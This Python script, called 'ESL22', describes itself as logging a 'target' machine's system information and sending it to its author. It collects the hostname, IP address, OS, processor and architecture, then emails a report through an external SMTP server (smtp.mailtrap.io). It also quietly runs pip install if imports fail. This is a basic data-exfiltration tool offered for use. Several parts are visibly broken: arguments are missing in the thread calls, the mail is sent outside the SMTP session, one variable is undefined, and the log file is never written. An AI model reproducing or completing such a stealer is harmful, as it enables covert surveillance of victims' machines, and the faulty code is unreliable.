"""
ESL22 is a basic and quality-based program to log the system information of

the target. If you inspect the code below there you are going to see what

information that can take.

Developed by ErWin.

Have a nice one.

"""

import socket

try:
    import subprocess
    import platform
    import datetime
    import time
    import os
    import threading
    import logging
    from email.message import EmailMessage
    from threading import Thread
    from multiprocessing import context
    import ssl
    import smtplib
    from email import encoders
    from email.mime.base import MIMEBase
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText



except ModuleNotFoundError:
    from subprocess import call
    modules = ["subprocess" , "platform" , "datetime" , "time" , "os" , "threading" , "smtplib"]
    call("pip install " + ' '.join(modules) , shell = True)




# Below there, we created a logs.txt file to save the captured information. Later on we are going to send the data to ourselves.

capped_info_location = "#####"

log_file = "{}/sys.txt".format(capped_info_location)



# We formed a list to store the captured information. We are going to save it to our file.

capped_info = []



# We will gather as much info as we can with the code below.
#class ESL22:
def gathering_info(self , log_file):
    hostname = socket.gethostname()
    ip = socket.gethostbyname(hostname)
    system = platform.system()
    machine = platform.processor()
    version = platform.version()
    processor = platform.processor()
    arch = platform.architecture()
    capped_info.append(hostname)
    capped_info.append(ip)
    capped_info.append(system)
    capped_info.append(machine)
    capped_info.append(version)
    capped_info.append(processor)
    capped_info.append(arch)


def send_mail(self , SENDER , RECEIVER , SENDER_PASSWORD , log_file , part , message):
    
    port = 2525
    
    smtp_server = "smtp.mailtrap.io"

    login = "XYZ" # Paste your auto-generated login.

    password = "ZYX" # Paste your auto-generated password.
    


    subject = "Yimir has completed it's task successfully!"

    message = MIMEMultipart()
    message['From: '] = SENDER
    message['To: '] = RECEIVER
    message['Subject: '] = subject


    # Body of the mail section.

    m_body = "Yimir knows something...\n \n by the Defense Department of Erwinium"
    message.attach(MIMEText(m_body , "plain"))



    filename = "sys.txt"

    text = message.as_string()


    part.add_header(
     "Content-Disposition" , 
    f"attachment; filename = {filename} " , )

    with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
        server.login(login , password)


    server.sendmail(SENDER , RECEIVER , text)

    print('The mail had sent successfully!')

# Threading Section

if __name__ == '__main__':
    Thread(target= gathering_info).start()
    Thread(target=send_mail).start()